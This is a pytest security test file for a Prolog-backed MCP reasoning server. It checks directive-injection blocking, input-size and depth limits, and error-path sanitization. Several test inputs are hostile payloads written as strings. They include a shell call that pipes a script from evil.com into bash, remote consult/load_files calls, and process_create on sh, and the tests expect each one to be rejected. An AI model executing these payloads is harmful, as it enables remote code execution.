"""Security tests for Euclid-MCP.

Tests injection prevention, DoS limits, and error sanitization.
"""

import pytest
from euclid_mcp.language import parse
from euclid_mcp.sanitizer import sanitize
from euclid_mcp.server import reason, MAX_KNOWLEDGE_LENGTH, MAX_DEPTH_LIMIT, MAX_SOLUTIONS_LIMIT
from euclid_mcp.prolog_bridge import _sanitize_error


# =============================================================================
# Phase 1: Input sanitization tests
# =============================================================================

class TestPrologDirectiveInjection:
    """Reject Prolog directives that could execute arbitrary commands."""

    def test_reject_shell_directive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- shell('id').")

    def test_reject_shell_in_fact(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- shell('curl http://evil.com/shell.sh | bash').")

    def test_reject_halt_directive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- halt.")

    def test_reject_consult_directive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- consult('http://evil.com/malicious.pl').")

    def test_reject_assert_directive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- assert(shell('id')).")

    def test_reject_retract_directive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- retractall(user(_)).")

    def test_reject_process_create(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- process_create(path(sh), ['-c', 'id'], []).")

    def test_reject_set_prolog_flag(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- set_prolog_flag(unknown, fail).")

    def test_reject_load_files(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- load_files('http://evil.com/x.pl').")

    def test_reject_rule_with_shell(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize("evil(X) :- shell(X)")

    def test_reject_shell_in_body(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize("p(X) IF shell(X)")

    def test_reject_halt_in_query(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize("? halt.")

    def test_reject_case_insensitive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- SHELL('id').")

    def test_reject_shell_with_space(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- shell ('id').")

    def test_allow_valid_euclid_ir(self):
        """Valid Euclid-IR should pass without error."""
        sanitize("""
parent(tom, bob)
parent(bob, ann)
ancestor($x, $y) IF parent($x, $y)
ancestor($x, $y) IF parent($x, $z) AND ancestor($z, $y)
? ancestor(tom, $who)
""")

    def test_allow_not_keyword(self):
        """NOT is a valid Euclid-IR keyword, not a dangerous pattern."""
        sanitize("blocked($user) IF NOT active($user)")

    def test_allow_arithmetic(self):
        """Arithmetic comparisons are valid Euclid-IR."""
        sanitize("stale($user) IF last_login($user, $days) AND $days > 90")

    def test_allow_comments_with_colon_slash(self):
        """Comments containing :// should not trigger false positives."""
        sanitize("# see http://example.com for docs\nparent(tom, bob)")


class TestInjectionViaParse:
    """Ensure injection is caught at the parse level."""

    def test_parse_rejects_directive(self):
        with pytest.raises(ValueError):
            parse(":- shell('id')\n? true")

    def test_parse_rejects_yaml_injection(self):
        with pytest.raises(ValueError):
            parse('facts:\n  - ":- shell(\'id\')"\nquery: "true"')


# =============================================================================
# Phase 2: Hard limits tests
# =============================================================================

class TestKnowledgeLengthLimit:
    """Ensure oversized knowledge is rejected."""

    def test_reject_oversized_knowledge(self):
        huge = "p(x" + "a" * (MAX_KNOWLEDGE_LENGTH + 1000) + ")\n? p($x)"
        result = reason(knowledge=huge)
        assert result.error is not None
        assert "exceeds maximum" in result.error

    def test_accept_large_but_valid_knowledge(self):
        """A large knowledge base within limits should be accepted."""
        facts = "\n".join(f"f{i}(v{i})" for i in range(1000))
        kb = facts + "\n? f0($x)"
        result = reason(knowledge=kb)
        # Should not fail on size validation (may fail on other reasons)
        assert "exceeds maximum" not in (result.error or "")


class TestMaxDepthLimits:
    """Ensure max_depth is bounded."""

    def test_max_depth_hard_capped(self):
        """max_depth above limit should be rejected by Pydantic."""
        # Pydantic Field(le=MAX_DEPTH_LIMIT) should reject this
        result = reason(
            knowledge="p(a)\n? p($x)",
            max_depth=MAX_DEPTH_LIMIT + 1,
        )
        # Pydantic validation error should produce an error
        assert result.error is not None


class TestMaxSolutionsLimits:
    """Ensure max_solutions is bounded."""

    def test_max_solutions_hard_capped(self):
        """max_solutions above limit should be rejected by Pydantic."""
        result = reason(
            knowledge="p(a)\n? p($x)",
            max_solutions=MAX_SOLUTIONS_LIMIT + 1,
        )
        assert result.error is not None


# =============================================================================
# Phase 3: Error sanitization tests
# =============================================================================

class TestErrorSanitization:
    """Ensure internal paths are not leaked in error messages."""

    def test_sanitize_temp_path(self):
        msg = "ERROR: /tmp/tmpAbC12345.pl:5: Syntax error: ..."
        clean = _sanitize_error(msg)
        assert "/tmp/" not in clean
        assert "<input>:" in clean

    def test_sanitize_multiple_paths(self):
        msg = "ERROR: /tmp/tmpABC.pl:10: and /tmp/tmpXYZ.pl:20: ..."
        clean = _sanitize_error(msg)
        assert "/tmp/" not in clean

    def test_sanitize_no_path(self):
        msg = "Some normal error message"
        clean = _sanitize_error(msg)
        assert clean == msg

    def test_error_in_reason_does_not_leak_path(self):
        """A failing Prolog query should not expose temp file paths."""
        result = reason(
            knowledge="p(a)\n? q($x)",  # q is undefined
        )
        if result.error:
            assert "/tmp/" not in result.error
            assert ".pl:" not in result.error
